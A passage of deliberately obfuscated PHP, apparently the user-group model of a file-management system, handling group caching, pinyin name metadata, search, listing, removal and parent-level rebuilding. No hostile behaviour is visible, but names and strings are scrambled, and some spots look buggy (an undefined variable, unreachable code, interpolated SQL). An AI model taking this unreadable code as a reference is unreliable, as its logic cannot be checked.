$õ£èã­Ì) { Model($ºäŠı¼§[1398])->remove($ºâ²óèš, $¸Ìà™İÄ); } else { if ($œÓ·Æ‡Ğ) { Model($ºäŠı¼§[1398])->set($ºâ²óèš, $œÓ·Æ‡Ğ, $¸Ìà™İÄ); } } } $½Ä ¸¼[$ºäŠı¼§[2090]] = $œÓ·Æ‡Ğ; } $this->metaSet($Øğ¾éŠ•, $½Ä ¸¼); } } private function _clearChildrenCache($Òğ£‘¸ñ) { $œ‡ÒÑÍ =& $_SERVER[ùèÅ´Ãš]; $ı›’ã÷ = array($œ‡ÒÑÍ[659] => array($œ‡ÒÑÍ[619], $Òğ£‘¸ñ[$œ‡ÒÑÍ[588]] . $Òğ£‘¸ñ[$œ‡ÒÑÍ[1404]] . $œ‡ÒÑÍ[620])); $ŠàùáÀƒ = $this->field($œ‡ÒÑÍ[1404])->where($ı›’ã÷)->select(); foreach ($ŠàùáÀƒ as $»—ã¬ğå) { $this->_clearCache($»—ã¬ğå[$œ‡ÒÑÍ[1404]]); } } private function _clearCache($ĞÆµÃš) { $ÀÈÉ¦… =& $_SERVER[ùèÅ´Ãš]; $this->cacheFunctionClear($ÀÈÉ¦…[2083], $ĞÆµÃš); $this->cacheFunctionClear($ÀÈÉ¦…[2084], $ĞÆµÃš); } private function _changeChildLevel($ÌÂ‡Üêø, $¡â °˜£, $âÂ¿›ü÷ = false) { $Ûï™ü«¬ =& $_SERVER[ùèÅ´Ãš]; $°Ğ¡úî = $ÌÂ‡Üêø[$Ûï™ü«¬[588]] . $ÌÂ‡Üêø[$Ûï™ü«¬[1404]] . $Ûï™ü«¬[50]; $õÈ†¿€  = $¡â °˜£[$Ûï™ü«¬[588]] . $¡â °˜£[$Ûï™ü«¬[1404]] . $Ûï™ü«¬[50] . $ÌÂ‡Üêø[$Ûï™ü«¬[1404]] . $Ûï™ü«¬[50]; if ($âÂ¿›ü÷) { $õÈ†¿€  = $¡â °˜£[$Ûï™ü«¬[588]] . $¡â °˜£[$Ûï™ü«¬[1404]] . $Ûï™ü«¬[50]; } $ ¥ùÆ‘ = array($Ûï™ü«¬[659] => array($Ûï™ü«¬[619], $ÌÂ‡Üêø[$Ûï™ü«¬[588]] . $ÌÂ‡Üêø[$Ûï™ü«¬[1404]] . $Ûï™ü«¬[620])); $„Ğğ²¦ = array($Ûï™ü«¬[659] => array($Ûï™ü«¬[668], "\162\145\160\x6c\141\143\x65\50\160\141\x72\145\156\x74\x4c\x65\166\145\154\x2c\47{$°Ğ¡úî}\47\x2c\47{$õÈ†¿€ }\47\51")); $this->_clearChildrenCache($ÌÂ‡Üêø); $this->where($ ¥ùÆ‘)->data($„Ğğ²¦)->save(); } public function setNamePinyin($ã·Éåşü, $×¾ùşã = false) { $¡¥¥©Ã‘ =& $_SERVER[ùèÅ´Ãš]; if (!$×¾ùşã) { $˜Ÿ±’ß = $this->getInfoSimple($ã·Éåşü); $×¾ùşã = $˜Ÿ±’ß[$¡¥¥©Ã‘[32]]; } if (!Input::check($×¾ùşã, $¡¥¥©Ã‘[662])) { $this->metaSet($ã·Éåşü, $¡¥¥©Ã‘[540], null); $this->metaSet($ã·Éåşü, $¡¥¥©Ã‘[539], null); return; } $øÃ–Ø–† = array($¡¥¥©Ã‘[540] => str_replace($¡¥¥©Ã‘[53], $¡¥¥©Ã‘[12], Pinyin::get($×¾ùşã)), $¡¥¥©Ã‘[539] => Pinyin::get($×¾ùşã, $¡¥¥©Ã‘[663])); $this->metaSet($ã·Éåşü, $øÃ–Ø–†); } protected function metaSet($ƒŞÈ™üÃ, $Şñ¥Ğ³ = null, $’»¤ğ»· = null) { $this->_clearCache($ƒŞÈ™üÃ); return parent::metaSet($ƒŞÈ™üÃ, $Şñ¥Ğ³, $’»¤ğ»·); } protected function groupStatus($—¬„Ã†Û, $˜ß¦¿˜Ü) { $İ’éîñê =& $_SERVER[ùèÅ´Ãš]; $ç–Î¬™É = $this->getInfoSimple($—¬„Ã†Û); if (!$ç–Î¬™É) { return !1; } $this->_clearCache($—¬„Ã†Û); return $this->metaSet($—¬„Ã†Û, $İ’éîñê[827], $˜ß¦¿˜Ü); if ($˜ß¦¿˜Ü == $İ’éîñê[91]) { $éÉÖÛ¶µ = $this->parentLevelArray($ç–Î¬™É[$İ’éîñê[588]]); } else { } $éÉÖÛ¶µ[] = $ç–Î¬™É[$İ’éîñê[1404]]; $…½êÚæ = array(); foreach ($éÉÖÛ¶µ as $—¬„Ã†Û) { $…½êÚæ[] = array($İ’éîñê[1404] => $—¬„Ã†Û, $İ’éîñê[97] => $İ’éîñê[827], $İ’éîñê[452] => $˜ß¦¿˜Ü); $this->_clearCache($—¬„Ã†Û); } return Model($İ’éîñê[2091])->addAll($…½êÚæ, array(), !0); } protected function groupRemove($Ÿ¾ËĞÂÁ, $ÁäÆ¤¹ = false) { $ŒâÄÏùš =& $_SERVER[ùèÅ´Ãš]; $¡¹¬…Ì = array($ŒâÄÏùš[1404] => $Ÿ¾ËĞÂÁ); $ÇÃÜ£å = $this->where($¡¹¬…Ì)->find(); if (!$ÇÃÜ£å || $ÇÃÜ£å[$ŒâÄÏùš[193]] == 0) { return !1; } if (!$ÁäÆ¤¹) { $Í¼ã‘¯˜ = $this->getInfoSimple($ÇÃÜ£å[$ŒâÄÏùš[193]]); $this->_changeChildLevel($ÇÃÜ£å, $Í¼ã‘¯˜, !0); $this->where(array($ŒâÄÏùš[193] => $Ÿ¾ËĞÂÁ))->save(array($ŒâÄÏùš[193] => $ÇÃÜ£å[$ŒâÄÏùš[193]])); $this->_clearCache($Í¼ã‘¯˜[$ŒâÄÏùš[1404]]); } Model($ŒâÄÏùš[2091])->where($¡¹¬…Ì)->delete(); Model($ŒâÄÏùš[2092])->where($¡¹¬…Ì)->delete(); Model($ŒâÄÏùš[908])->groupRootRemove($Ÿ¾ËĞÂÁ); $this->_clearCache($ÇÃÜ£å[$ŒâÄÏùš[193]]); return $this->where($¡¹¬…Ì)->delete(); } protected function groupSort($…İüœ™°) { $©³îİ¯” =& $_SERVER[ùèÅ´Ãš]; $»¯šë¦» = array(); foreach ($…İüœ™° as $«ê€Åší => $×½‰ ’) { $»¯šë¦»[] = array($©³îİ¯”[1404], $×½‰ ’, $©³îİ¯”[2021], $«ê€Åší + 1); } $this->saveAll($»¯šë¦»); } public function listData() { $‘ïœÆğ‹ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($‘ïœÆğ‹[$_SERVER[ùèÅ´Ãš][447]]); return $‘ïœÆğ‹; } private function _makeOrder($¹èøøò = '') { $×‘Ë¤› =& $_SERVER[ùèÅ´Ãš]; $‚Šæ—£  = array($×‘Ë¤›[1404], $×‘Ë¤›[32], $×‘Ë¤›[1986], $×‘Ë¤›[234]); $ÀÌ‰…ï† = array($×‘Ë¤›[525] => $×‘Ë¤›[526], $×‘Ë¤›[527] => $×‘Ë¤›[528]); $µƒ©‚èÛ = Input::get($×‘Ë¤›[532], $×‘Ë¤›[7], $×‘Ë¤›[2001], $‚Šæ—£ ); $–í²·Ÿ = Input::get($×‘Ë¤›[533], $×‘Ë¤›[7], $×‘Ë¤›[2093], array($×‘Ë¤›[2093], $×‘Ë¤›[527])); $–í²·Ÿ = $ÀÌ‰…ï†[$–í²·Ÿ]; $¹èøøò = $¹èøøò . "{$µƒ©‚èÛ}\40{$–í²·Ÿ}\54\x20\147\x72\x6f\x75\160\111\104\x20\x61\163\x63"; return $this->order($¹èøøò); } public function listChild($‘ÛÒ·å) { $ÖããõÑ =& $_SERVER[ùèÅ´Ãš]; $ÕÒ×‚›Ü = $this->where(array($ÖããõÑ[193] => $‘ÛÒ·å))->_makeOrder()->selectPage(200); $this->_listDataApply($ÕÒ×‚›Ü[$ÖããõÑ[447]]); return $ÕÒ×‚›Ü; } public function listChildIds($Ÿùº®ö) { $ç›Ş©Î =& $_SERVER[ùèÅ´Ãš]; if (is_string($èœó·ğ)) { $Ÿùº®ö = explode($ç›Ş©Î[50], $Ÿùº®ö); } $ Æı¿¦ = $this->where(array($ç›Ş©Î[1404] => array($ç›Ş©Î[7], $Ÿùº®ö)))->field($ç›Ş©Î[2094])->select(); if (!$ Æı¿¦) { return !1; } $‘ÂøÚòé = array(); foreach ($ Æı¿¦ as $¼ÄÕİŒÑ) { $‘ÂøÚòé[] = "\x73\145\x6c\145\143\164\x20\x67\x72\x6f\165\160\111\104\40\146\162\157\155\40\x60\x67\x72\x6f\165\x70\140\x20\x77\x68\145\162\145\x20\x70\141\x72\x65\x6e\x74\114\145\166\x65\154\40\x6c\x69\153\x65\40\x27{$¼ÄÕİŒÑ[$ç›Ş©Î[588]]}{$¼ÄÕİŒÑ[$ç›Ş©Î[1404]]}\54\45\47"; } $‘ÂøÚòé = implode($ç›Ş©Î[2095], $‘ÂøÚòé); $ Æı¿¦ = $this->query($‘ÂøÚòé); if (!$ Æı¿¦) { return array(); } $Ÿùº®ö = array_to_keyvalue($ Æı¿¦, $ç›Ş©Î[12], $ç›Ş©Î[1404]); return array_unique($Ÿùº®ö); } public function listByID($®µ½àä°) { $÷Øš¯× =& $_SERVER[ùèÅ´Ãš]; if (!$®µ½àä°) { return array(); } $çËõŒˆ = array($÷Øš¯×[1404] => array($÷Øš¯×[7], $®µ½àä°)); $“ãï‹ò› = $this->where($çËõŒˆ)->select(); $“ãï‹ò› = array_sort_keep($“ãï‹ò›, $÷Øš¯×[1404], $®µ½àä°); $this->_listDataApply($“ãï‹ò›); return $“ãï‹ò›; } public function listSearch($‘èÄ¦œ÷) { $¹®¸¨Ôá =& $_SERVER[ùèÅ´Ãš]; $Ù™ÊÕˆÊ = trim($‘èÄ¦œ÷[$¹®¸¨Ôá[2096]]); $ö±Ñéıõ = explode($¹®¸¨Ôá[53], $Ù™ÊÕˆÊ); if (!$Ù™ÊÕˆÊ || count($ö±Ñéıõ) == 1) { return $this->listSearchNow($‘èÄ¦œ÷); } $„Ã¾èèº = array($¹®¸¨Ôá[447] => array()); foreach ($ö±Ñéıõ as $¤æ…Ş¡›) { if (!trim($¤æ…Ş¡›)) { continue; } $‘èÄ¦œ÷[$¹®¸¨Ôá[2096]] = $¤æ…Ş¡›; $ÑşŸ­àœ = $this->listSearchNow($‘èÄ¦œ÷); $„Ã¾èèº[$¹®¸¨Ôá[447]] = array_merge($„Ã¾èèº[$¹®¸¨Ôá[447]], $ÑşŸ­àœ[$¹®¸¨Ôá[447]]); } $„Ã¾èèº[$¹®¸¨Ôá[447]] = array_unique_by_key($„Ã¾èèº[$¹®¸¨Ôá[447]], $¹®¸¨Ôá[1404]); $„Ã¾èèº[$¹®¸¨Ôá[444]] = array($¹®¸¨Ôá[445] => count($„Ã¾èèº[$¹®¸¨Ôá[447]]), $¹®¸¨Ôá[441] => 20, $¹®¸¨Ôá[430] => 1, $¹®¸¨Ôá[446] => 1); return $„Ã¾èèº; } public function listSearchNow($ÙúØˆÃ) { $ÄÅÔÑš =& $_SERVER[ùèÅ´Ãš]; $ùÅíôÄ‘ = trim($ÙúØˆÃ[$ÄÅÔÑš[2096]]); $ƒ¤òåß† = isset($ÙúØˆÃ[$ÄÅÔÑš[2097]]) ? $ÙúØˆÃ[$ÄÅÔÑš[2097]] : !1; if (!trim($ùÅíôÄ‘)) { return !1; } $ùÅíôÄ‘ = str_replace($ÄÅÔÑš[2098], $ÄÅÔÑš[2099], $ùÅíôÄ‘); $‡—«–³€ = array($ÄÅÔÑš[1404] => array($ÄÅÔÑš[461], "{$ùÅíôÄ‘}\x25"), $ÄÅÔÑš[32] => array($ÄÅÔÑš[461], "\45{$ùÅíôÄ‘}\45"), $ÄÅÔÑš[1088] => $ÄÅÔÑš[2100]); if ($ƒ¤òåß†) { $ÕŒ†£ğ = $this->getInfoSimple($ƒ¤òåß†); $¼­ĞâæÍ = $ÕŒ†£ğ[$ÄÅÔÑš[588]] . $ƒ¤òåß† . $ÄÅÔÑš[620]; $‡—«–³€ = array($‡—«–³€, array($ÄÅÔÑš[588] => array($ÄÅÔÑš[461], $¼­ĞâæÍ))); } $‡—«–³€ = $this->parseWhereLike($‡—«–³€); $Ç‚ÀöÛù = $this->_makeOrder()->where($‡—«–³€)->selectPage(20); $Ç‚ÀöÛù = $Ç‚ÀöÛù ? $Ç‚ÀöÛù : array($ÄÅÔÑš[447] => array(), $ÄÅÔÑš[444] => array()); if (!$Ç‚ÀöÛù || count($Ç‚ÀöÛù[$ÄÅÔÑš[447]]) < 5 && Input::check($ùÅíôÄ‘, $ÄÅÔÑš[395])) { $ƒéÁ¦Ø = $this->groupChildrenAll($ƒ¤òåß†); $ü½¦Íæò = $this->_searchFromMeta($ÄÅÔÑš[539], $ùÅíôÄ‘, 10, $ƒéÁ¦Ø); $˜îÓ¥ú = $this->_searchFromMeta($ÄÅÔÑš[540], $ùÅíôÄ‘, 10, $ƒéÁ¦Ø); $¢ÀÆ¹ºŞ = array_merge($ü½¦Íæò, $˜îÓ¥ú, $Ç‚ÀöÛù[$ÄÅÔÑš[447]]); $Ç‚ÀöÛù[$ÄÅÔÑš[447]] = array_unique_by_key($¢ÀÆ¹ºŞ, $ÄÅÔÑš[1404]); $Ç‚ÀöÛù[$ÄÅÔÑš[444]][$ÄÅÔÑš[445]] = count($Ç‚ÀöÛù[$ÄÅÔÑš[447]]); $Ç‚ÀöÛù[$ÄÅÔÑš[444]][$ÄÅÔÑš[446]] = ceil($Ç‚ÀöÛù[$ÄÅÔÑš[444]][$ÄÅÔÑš[445]] / $Ç‚ÀöÛù[$ÄÅÔÑš[444]][$ÄÅÔÑš[441]]); } $this->_listDataApply($Ç‚ÀöÛù[$ÄÅÔÑš[447]]); return $Ç‚ÀöÛù; } protected function groupChildrenAll($ÏŞ­‡£Œ) { $ê¥ñ‘›í =& $_SERVER[ùèÅ´Ãš]; if (!$ÏŞ­‡£Œ) { return !1; } if (!is_array($ÏŞ­‡£Œ)) { $ÏŞ­‡£Œ = array($ÏŞ­‡£Œ); } $»ğ´§Õı = $ÏŞ­‡£Œ; foreach ($ÏŞ­‡£Œ as $’ß¸ÌÌØ) { $Û—Î†ûÂ = $this->getInfoSimple($’ß¸ÌÌØ); $•Ü°ÍÚ€ = array($ê¥ñ‘›í[588] => array($ê¥ñ‘›í[461], $Û—Î†ûÂ[$ê¥ñ‘›í[588]] . $’ß¸ÌÌØ . $ê¥ñ‘›í[620])); $ò©ş¬ Ü = $this->field($ê¥ñ‘›í[1404])->where($•Ü°ÍÚ€)->select(); $»ğ´§Õı = array_merge($»ğ´§Õı, array_to_keyvalue($ò©ş¬ Ü, $ê¥ñ‘›í[12], $ê¥ñ‘›í[1404])); } return array_unique($»ğ´§Õı); } private function _searchFromMeta($Š‹Éı•¾, $şÑË¥ÆÜ, $ä›şÂìÏ, $¶› ¦¹) { $Ç¡¨Üã =& $_SERVER[ùèÅ´Ãš]; $şÑË¥ÆÜ = strtolower($şÑË¥ÆÜ); $î»ì¹”’ = array($Ç¡¨Üã[97] => $Š‹Éı•¾, $Ç¡¨Üã[452] => array($Ç¡¨Üã[461], "\x25{$şÑË¥ÆÜ}\45")); $î»ì¹”’ = $this->parseWhereLike($î»ì¹”’); if ($¶› ¦¹) { $î»ì¹”’[$Ç¡¨Üã[1404]] = array($Ç¡¨Üã[7], $¶› ¦¹); } $Ùãäô´ı = Model($Ç¡¨Üã[2101])->where($î»ì¹”’)->limit($ä›şÂìÏ)->select(); if (!$Ùãäô´ı) { return array(); } $Ùãäô´ı = array_to_keyvalue($Ùãäô´ı, $Ç¡¨Üã[12], $Ç¡¨Üã[1404]); $Á„ıà±è = $this->where(array($Ç¡¨Üã[2087] => array($Ç¡¨Üã[7], $Ùãäô´ı)))->select(); if (!$Á„ıà±è) { return array(); } return $Á„ıà±è; } protected function _listDataApplyItem($Ò˜İ£ÆØ) { $ø¨‚«í• = array($Ò˜İ£ÆØ); $this->_listDataApply($ø¨‚«í•); return $ø¨‚«í•[0]; } protected function _listDataApply(&$ÍíÀ•À­) { $ÀšĞÆ³É =& $_SERVER[ùèÅ´Ãš]; if (!$ÍíÀ•À­) { return; } $‹ß’‹Ó© = array_to_keyvalue($ÍíÀ•À­, $ÀšĞÆ³É[12], $ÀšĞÆ³É[1404]); $this->_listAppendChildren($ÍíÀ•À­); $this->_listAppendChildrenMember($ÍíÀ•À­); $this->_listAppendMeta($ÍíÀ•À­, $‹ß’‹Ó©); $this->_listAppendParent($ÍíÀ•À­); $this->_listAppendSourceRoot($ÍíÀ•À­, $‹ß’‹Ó©); } private function _listAppendChildren(&$¦ºÍ‰Ÿ) { $ı»¡›Œ§ =& $_SERVER[ùèÅ´Ãš]; $—»úæÌ§ = array_to_keyvalue($¦ºÍ‰Ÿ, $ı»¡›Œ§[12], $ı»¡›Œ§[1404]); $ª‘ÀéÔ = array($ı»¡›Œ§[193] => array($ı»¡›Œ§[7], $—»úæÌ§)); $ÓŞ†Ùñ = array($ı»¡›Œ§[193], $ı»¡›Œ§[2102] => $ı»¡›Œ§[569]); $ì¶ñëÊñ = $this->field($ÓŞ†Ùñ)->where($ª‘ÀéÔ)->group($ı»¡›Œ§[193])->select(); $Œï×î Ö = array_to_keyvalue($ì¶ñëÊñ, $ı»¡›Œ§[193], $ı»¡›Œ§[569]); foreach ($¦ºÍ‰Ÿ as &$­ëÉÑ å) { $”…ƒÅ¥¶ = $­ëÉÑ å[$ı»¡›Œ§[1404]]; $­ëÉÑ å[$ı»¡›Œ§[2103]] = isset($Œï×î Ö[$”…ƒÅ¥¶]) ? intval($Œï×î Ö[$”…ƒÅ¥¶]) : !1; } unset($­ëÉÑ å); } private function _listAppendChildrenMember(&$‚Ä›ÇÀ) { $Óù“ÛŠó =& $_SERVER[ùèÅ´Ãš]; $ÇçĞéçä = array_to_keyvalue($‚Ä›ÇÀ, $Óù“ÛŠó[12], $Óù“ÛŠó[1404]); $ÚØ¢Ôã” = array($Óù“ÛŠó[1404] => array($Óù“ÛŠó[7], $ÇçĞéçä)); $Á°Ä¢ = array($Óù“ÛŠó[1404], $Óù“ÛŠó[2102] => $Óù“ÛŠó[569]); $­ õóÊ = Model($Óù“ÛŠó[2092])->field($Á°Ä¢)->where($ÚØ¢Ôã”)->group($Óù“ÛŠó[1404])->select(); $ü§« Ä  = array_to_keyvalue($­ õóÊ, $Óù“ÛŠó[1404], $Óù“ÛŠó[569]); foreach ($‚Ä›ÇÀ as &$µ•™¯••) { $ÀÙñÈê² = $µ•™¯••[$Óù“ÛŠó[1404]]; $µ•™¯••[$Óù“ÛŠó[2104]] = isset($ü§« Ä [$ÀÙñÈê²]) ? intval($ü§« Ä [$ÀÙñÈê²]) : !1; } unset($µ•™¯••); } private function _listAppendMeta(&$‡š†Î†³, $Ì¾¥¢ºò) { $¶÷±å£˜ =& $_SERVER[ùèÅ´Ãš]; $Ã¯êúÓÕ = array($¶÷±å£˜[1404] => array($¶÷±å£˜[7], $Ì¾¥¢ºò)); $Ìœ£²ÄÂ = Model($¶÷±å£˜[2091])->where($Ã¯êúÓÕ)->select(); $Ìœ£²ÄÂ = array_to_keyvalue_group($Ìœ£²ÄÂ, $¶÷±å£˜[1404]); foreach ($Ìœ£²ÄÂ as &$ñõ÷Ò´‰) { $ñõ÷Ò´‰ = array_to_keyvalue($ñõ÷Ò´‰, $¶÷±å£˜[97], $¶÷±å£˜[452]); } unset($ñõ÷Ò´‰); foreach ($‡š†Î†³ as &$¥š¦ŒÂá) { $¥š¦ŒÂá[$¶÷±å£˜[543]] = array(); if (isset($Ìœ£²ÄÂ[$¥š¦ŒÂá[$¶÷±å£˜[1404]]])) { $¥š¦ŒÂá[$¶÷±å£˜[543]] = $Ìœ£²ÄÂ[$¥š¦ŒÂá[$¶÷±å£˜[1404]]]; } } unset($¥š¦ŒÂá); } protected function parentLevelArray($ª­Îº­Õ) { $ˆ³ÜÌ¸ş =& $_SERVER[ùèÅ´Ãš]; $ª­Îº­Õ = explode($ˆ³ÜÌ¸ş[50], trim($ª­Îº­Õ, $ˆ³ÜÌ¸ş[50])); $ª­Îº­Õ = array_remove_value($ª­Îº­Õ, $ˆ³ÜÌ¸ş[231]); return $ª­Îº­Õ; } protected function parentInGroup($êşµ¤Ÿ–, $ı”¬Ê‰ş) { $„ÕÜ³³¨ =& $_SERVER[ùèÅ´Ãš]; $È‚Ûõ› = $this->getInfoSimple($êşµ¤Ÿ–); if (!$È‚Ûõ›) { return !0; } $ÜÜğêÄÓ = $this->parentLevelArray($È‚Ûõ›[$„ÕÜ³³¨[588]]); $ÜÜğêÄÓ[] = $êşµ¤Ÿ–; foreach ($ÜÜğêÄÓ as $êşµ¤Ÿ–) { if (in_array($êşµ¤Ÿ– . $„ÕÜ³³¨[12], $ı”¬Ê‰ş)) { return !0; } } return !1; } private function _listAppendParent(&$Âï’µ©´) { $ÚÅŠ–»ò =& $_SERVER[ùèÅ´Ãš]; $¸¹œ¾ğ¹ = array(); foreach ($Âï’µ©´ as &$¥áš§ÃÑ) { $¸¹œ¾ğ¹[$¥áš§ÃÑ[$ÚÅŠ–»ò[1404]]] = $¥áš§ÃÑ[$ÚÅŠ–»ò[32]]; $µïÛºö = $this->parentLevelArray($¥áš§ÃÑ[$ÚÅŠ–»ò[588]]); foreach ($µïÛºö as $Œ ›Ãö½) { if (!isset($¸¹œ¾ğ¹[$Œ ›Ãö½])) { $¸¹œ¾ğ¹[$Œ ›Ãö½] = 0; } } } unset($¥áš§ÃÑ); foreach ($¸¹œ¾ğ¹ as $ëÉ”×®Ğ => $è—Ñ½´Å) { if ($è—Ñ½´Å) { continue; } $Â¬½ª¹« = $this->getInfoSimple($ëÉ”×®Ğ); $¸¹œ¾ğ¹[$ëÉ”×®Ğ] = $Â¬½ª¹«[$ÚÅŠ–»ò[32]]; } $¼®à î² = $GLOBALS[$ÚÅŠ–»ò[6]][$ÚÅŠ–»ò[92]][$ÚÅŠ–»ò[2105]]; if (KodUser::isRoot()) { $¼®à î² = !1; } foreach ($Âï’µ©´ as &$¥áš§ÃÑ) { $µïÛºö = $this->parentLevelArray($¥áš§ÃÑ[$ÚÅŠ–»ò[588]]); $é«Ü¦Ò = $ÚÅŠ–»ò[12]; foreach ($µïÛºö as $ëÉ”×®Ğ => $Œ ›Ãö½) { if ($¼®à î² && $ëÉ”×®Ğ == 0) { continue; } $é«Ü¦Ò .= $¸¹œ¾ğ¹[$Œ ›Ãö½] . $ÚÅŠ–»ò[8]; } if ($µïÛºö) { $é«Ü¦Ò .= $¥áš§ÃÑ[$ÚÅŠ–»ò[32]]; } $¥áš§ÃÑ[$ÚÅŠ–»ò[593]] = str_replace($ÚÅŠ–»ò[257], $ÚÅŠ–»ò[8], $é«Ü¦Ò); } unset($¥áš§ÃÑ); } private function _listAppendSourceRoot(&$ùİÌéò¼, $î´ôÀÜà) { $×ªÖÈöÄ =& $_SERVER[ùèÅ´Ãš]; $†Ñ¢Ú‘ = Model($×ªÖÈöÄ[908])->listSourceRoot(SourceModel::TYPE_GROUP, $î´ôÀÜà); $†Ñ¢Ú‘ = array_to_keyvalue($†Ñ¢Ú‘, $×ªÖÈöÄ[573]); $†Ñ¢Ú‘ = array_remove_key($†Ñ¢Ú‘, $×ªÖÈöÄ[573]); foreach ($ùİÌéò¼ as &$Ò™†á) { $Ò™†á[$×ªÖÈöÄ[90]] = $†Ñ¢Ú‘[$Ò™†á[$×ªÖÈöÄ[1404]]] ? $†Ñ¢Ú‘[$Ò™†á[$×ªÖÈöÄ[1404]]] : array(); } unset($Ò™†á); } protected function groupMerge($É·¬úğ) { $É·¬úğ = array_values(array_unique($É·¬úğ)); $åâÛó÷Â = array(); for ($»²·ÂÀá = 0; $»²·ÂÀá < count($É·¬úğ); $»²·ÂÀá++) { $êŸµõİ² = !1; for ($¿‰Ô·½× = 0; $¿‰Ô·½× < count($É·¬úğ); $¿‰Ô·½×++) { if ($»²·ÂÀá == $¿‰Ô·½×) { continue; } if ($this->isParentOf($É·¬úğ[$¿‰Ô·½×], $É·¬úğ[$»²·ÂÀá])) { $êŸµõİ² = !0; break; } } if (!$êŸµõİ²) { $åâÛó÷Â[] = $É·¬úğ[$»²·ÂÀá]; } } return $åâÛó÷Â; } protected function isParentOf($’û—ûü‘, $á¶›¹Î) { $ÙÎµ…è¬ =& $_SERVER[ùèÅ´Ãš]; if (!$’û—ûü‘ || !$á¶›¹Î || $’û—ûü‘ == $á¶›¹Î) { return !1; } $€¬è½×™ = $this->getInfoSimple($’û—ûü‘); $’·ô¿³ = $this->getInfoSimple($á¶›¹Î); $œ“¯á“ = $€¬è½×™[$ÙÎµ…è¬[588]] . $’û—ûü‘ . $ÙÎµ…è¬[50]; if (substr($’·ô¿³[$ÙÎµ…è¬[588]], 0, strlen($œ“¯á“)) == $œ“¯á“) { return !0; } return !1; } public function groupShowRoot($—È±ˆ„Ş, $†§õ¢ÊÈ = false) { $şåúÇïÅ =& $_SERVER[ùèÅ´Ãš]; $†ˆ—˜Êé = $this->getInfo($—È±ˆ„Ş); if (!$†ˆ—˜Êé) { return array(); } $âå¹‹Ó = $this->parentLevelArray($†ˆ—˜Êé[$şåúÇïÅ[588]]); $Âı¶Í„ù = array($—È±ˆ„Ş); if (count($âå¹‹Ó) == 0) { return $Âı¶Í„ù; } if ($†§õ¢ÊÈ && count($âå¹‹Ó) == 1) { return $Âı¶Í„ù; } if (!$†ˆ—˜Êé[$şåúÇïÅ[543]] || !isset($†ˆ—˜Êé[$şåúÇïÅ[543]][$şåúÇïÅ[2088]]) || $†ˆ—˜Êé[$şåúÇïÅ[543]][$şåúÇïÅ[2088]] == $şåúÇïÅ[854]) { return $this->groupShowRoot($âå¹‹Ó[count($âå¹‹Ó) - 1], $†§õ¢ÊÈ); } if ($†ˆ—˜Êé[$şåúÇïÅ[543]][$şåúÇïÅ[2088]] == $şåúÇïÅ[434]) { $®Œ˜…• = explode($şåúÇïÅ[50], $†ˆ—˜Êé[$şåúÇïÅ[543]][$şåúÇïÅ[2089]]); if ($®Œ˜…•) { $Âı¶Í„ù = array_merge($Âı¶Í„ù, $®Œ˜…•); } } return $Âı¶Í„ù; } protected function resetParentLevel() { $ª¾ş´İû =& $_SERVER[ùèÅ´Ãš]; $óƒ¹ïªº = $ª¾ş´İû[1404]; $é½€ÙËñ = $this->select(); $é½€ÙËñ = array_to_keyvalue($é½€ÙËñ, $óƒ¹ïªº); foreach ($é½€ÙËñ as $Ô©¼ÃüÁ) { $±‡¶Ùˆ = $Ô©¼ÃüÁ; $á‡İàÏ = array(); while ($±‡¶Ùˆ[$ª¾ş´İû[193]] != 0) { $á‡İàÏ[] = $±‡¶Ùˆ[$ª¾ş´İû[193]]; $±‡¶Ùˆ = $é½€ÙËñ[$±‡¶Ùˆ[$ª¾ş´İû[193]]]; } $á‡İàÏ[] = 0; $á‡İàÏ = $ª¾ş´İû[50] . implode($ª¾ş´İû[50], array_reverse($á‡İàÏ)) . $ª¾ş´İû[50]; $this->setNamePinyin($Ô©¼ÃüÁ[$óƒ¹ïªº], $Ô©¼ÃüÁ[$ª¾ş´İû[32]]); $this->where(array($óƒ¹ïªº => $Ô©¼ÃüÁ[$óƒ¹ïªº]))->save(array($ª¾ş´İû[659] => $á‡İàÏ)); } return $é½€ÙËñ; } public function groupNameAuto($’¶Á‹ØØ, $ğ³á©ä®) { $šÕ«€¯ù =& $_SERVER[ùèÅ´Ãš]; $Öäˆ·¦ü = $this->where(array($šÕ«€¯ù[479] => $’¶Á‹ØØ))->getField($šÕ«€¯ù[32], !0); if (!$Öäˆ·¦ü || !in_array($ğ³á©ä®, $Öäˆ·¦ü)) { return $ğ³á©ä®; } for ($–¸ŸÃ¸¨ = 1; $–¸ŸÃ¸¨ <= count($Öäˆ·¦ü) + 1; $–¸ŸÃ¸¨++) { $èÁÛ¯å× = $ğ³á©ä® . "\x28{$–¸ŸÃ¸¨}\x29"; if (!in_array($èÁÛ¯å×, $Öäˆ·¦ü)) { return $èÁÛ¯å×; } } } public function groupSwitch($Ûóòƒ¸—, $œ›«Œ—±) { $“ÒËÏÌ =& $_SERVER[ùèÅ´Ãš]; $…¬£Ú¤Ş = array($“ÒËÏÌ[1404] => array($“ÒËÏÌ[7], array($Ûóòƒ¸—, $œ›«Œ—±))); $†ÏŸåµ× = $this->where($…¬£Ú¤Ş)->select(); $†ÏŸåµ× = array_to_keyvalue($†ÏŸåµ×, $“ÒËÏÌ[1404]); if (!isset($†ÏŸåµ×[$Ûóòƒ¸—]) || !isset($†ÏŸåµ×[$œ›«Œ—±]) || $†ÏŸåµ×[$Ûóòƒ¸—][$“ÒËÏÌ[193]] == 0) { return !1; } $…¬£Ú¤Ş = array($“ÒËÏÌ[1404] => $Ûóòƒ¸—); $ƒ—Ø¦Áû = Model($“ÒËÏÌ[2092])->where($…¬£Ú¤Ş)->select(); if (!$ƒ—Ø¦Áû) { $ƒ—Ø¦Áû = array(); } foreach ($ƒ—Ø¦Áû as $¯­Èäğ·) { $åéšÏ = $¯­Èäğ·[$“ÒËÏÌ[1797]]; $…¬£Ú¤Ş = array($“ÒËÏÌ[1797] => $åéšÏ, $“ÒËÏÌ[1404] => $œ›«Œ—±); $ËäÙŸİ = Model($“ÒËÏÌ[2092])->where($…¬£Ú¤Ş)->find(); if (!$ËäÙŸİ) { $µª±À = array($œ›«Œ—± => $¯­Èäğ·[$“ÒËÏÌ[2106]]); Model($“ÒËÏÌ[601])->userGroupAdd($åéšÏ, $µª±À); } Model($“ÒËÏÌ[601])->userGroupRemove($åéšÏ, $Ûóòƒ¸—); } $…¬£Ú¤Ş = array($“ÒËÏÌ[191] => 2, $“ÒËÏÌ[193] => 0, $“ÒËÏÌ[487] => 1, $“ÒËÏÌ[573] => array($“ÒËÏÌ[7], array($Ûóòƒ¸—, $œ›«Œ—±))); 